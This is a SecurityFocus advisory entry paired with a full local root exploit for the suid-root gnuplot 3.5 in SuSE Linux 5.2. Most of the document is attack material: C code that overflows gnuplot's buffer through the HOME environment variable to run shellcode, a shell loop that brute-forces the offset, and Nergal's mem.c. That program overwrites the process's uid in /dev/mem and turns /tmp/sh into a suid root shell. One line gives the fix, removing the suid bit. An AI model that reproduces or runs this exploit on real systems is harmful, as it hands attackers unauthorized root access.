source: http://www.securityfocus.com/bid/319/info

Linux gnuplot 3.5 is shipped with S.u.S.E. Linux 5.2 and installed suid root by default. There is a buffer overflow vulnerability present in gnuplot which allows for users to obtain root access locally. 

/*

gnuplot Linux x86 exploit from xnec

tested on gnuplot Linux version 3.5 (pre 3.6) patchlevel beta 336/SuSE 5.2

gnuplot ships suidroot by default in SuSE 5.2, maybe others

gcc -o xnec_plot xnec_plot.c

./xnec_plot <bufsiz> <offset>

The buffer we're overflowing is only 80 bytes, so we're going to have to

get our settings just so. If you don't feel like typing in command line

offsets and bufsizes, make a little shell script: --- #! /bin/bash

bufsiz=110

offset=0

while [ $offset -lt 500 ]; do

./xnec_plot $bufsiz $offset

offset=`expr $offset + 10`

done --- since gnuplot drops root privs after it inits your svga, we can't just exec

/bin/sh, we'll need to use the technique of replacing our saved uid

in /dev/mem with '0', then execing whatever we please. We do this by compiling

Nergal's program, mem.c and putting the output file in /tmp/xp, as in

gcc -o /tmp/xp mem.c. Nergal's program will then make /tmp/sh suidroot,

so don't forget to cp /bin/sh /tmp/sh. You will also have to change

line 32 to the correct address of kstat, which can be obtained by doing

strings /proc/ksyms | grep kstat.

Since I can see absolutely no reason for gnuplot to be suidroot, the bestfix is chmod -s /usr/bin/gnuplot.

greets to #sk1llz, xnec on EFnet and DALnet

*/

#include <stdlib.h>

#define DEFAULT_OFFSET 50

#define DEFAULT_BUFSIZ 110

#define NOP 0x90

#define DEFAULT_ADDR 0xbffff81c

/* Aleph One's shellcode, modified to run our own program */

char shellcode[] =

"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"

"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"

"\x80\xe8\xdc\xff\xff\xff/tmp/xp";

unsigned long getsp(void) {

__asm__("movl %esp,%eax");

}

void main(int argc, char *argv[]) {

char *buf, *ret;

long *addrp, addr;

int bufsiz, offset;

int i;

bufsiz=DEFAULT_BUFSIZ;

offset=DEFAULT_OFFSET;

if (argc = 2) bufsiz = atoi(argv[1]);

if (argc = 3) offset = atoi(argv[2]);

buf=malloc(bufsiz);

addr = getsp() - offset;

printf("address: 0x%x\n", addr);

printf("bufsize: %d\n", bufsiz);

printf("offset : %d\n", offset);

ret = buf;

addrp = (long *) ret;

for (i = 0; i < bufsiz; i+=4)

*(addrp++) = addr;

memset(buf, NOP, (strlen(shellcode)/2));

ret = buf + ((bufsiz/2) - (strlen(shellcode)/2));

for (i = 0; i < strlen(shellcode); i++)

*(ret++) = shellcode[i];

buf[bufsiz - 1] = '\0';

memcpy(buf,"HOME=", 5);

setenv("HOME", buf, 1);

execvp("/usr/bin/gnuplot", NULL);

} ---snip---

mem.c

---snip---

/* by Nergal */

#define SEEK_SET 0

#define __KERNEL__

#include <linux/sched.h>

#undef __KERNEL__

#define SIZEOF sizeof(struct task_struct)

int mem_fd;

int mypid;

void

testtask (unsigned int mem_offset)

{

struct task_struct some_task;

int uid, pid;

lseek (mem_fd, mem_offset, SEEK_SET);

read (mem_fd, &some_task, SIZEOF);

if (some_task.pid == mypid) /* is it our task_struct ? */

{

some_task.euid = 0;

some_task.fsuid = 0; /* needed for chown */

lseek (mem_fd, mem_offset, SEEK_SET);

write (mem_fd, &some_task, SIZEOF);

/* from now on, there is no law beyond do what thou wilt */

chown ("/tmp/sh", 0, 0);

chmod ("/tmp/sh", 04755);

exit (0);

}

}

#define KSTAT 0x001a8fb8 /* <-- replace this addr with that of your kstat */

main () /* by doing strings /proc/ksyms |grep kstat */

{ unsigned int i;

struct task_struct *task[NR_TASKS];

unsigned int task_addr = KSTAT - NR_TASKS * 4;

mem_fd = 3; /* presumed to be opened /dev/mem */ mypid = getpid ();

lseek (mem_fd, task_addr, SEEK_SET);

read (mem_fd, task, NR_TASKS * 4);

for (i = 0; i < NR_TASKS; i++)

if (task[i])

testtask ((unsigned int)(task[i]));

} 